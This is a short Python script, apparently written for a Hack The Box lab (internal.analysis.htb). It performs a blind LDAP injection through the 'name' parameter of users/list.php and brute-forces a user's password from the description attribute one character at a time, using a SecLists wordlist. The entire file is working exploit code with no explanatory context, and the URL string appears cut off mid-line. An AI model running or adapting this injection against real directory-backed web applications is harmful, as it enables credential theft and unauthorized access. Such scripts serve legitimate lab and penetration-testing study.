import requests
import os

# Prompt user for wordlist input
charset_path = input("Enter the wordlist or charset (press Enter to use the default): ").strip()

# Use default wordlist if user didn't provide one
if not charset_path:
    charset_path = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"

base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*>
#If the enumeration gets to the point, when it discovers a * symbol in the password, it will enter into infinite loop, 
#so add a found characters in found_chars string, to avoid it from happening
found_chars = ""

try:
    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            modified_url = base_url.replace("{FUZZ}", char).replace("{found_char}", found_chars)
            print("Modified URL:", modified_url)

            response = requests.get(modified_url)

            if response.status_code == 200 and "technician" in response.text:
                print("Found character:", char)
                found_chars += char
                file.seek(0)  # Move the file pointer to the beginning for another iteration
except Exception as e:
    print(f"An error occurred: {e}")

print("Final found characters:", found_chars)
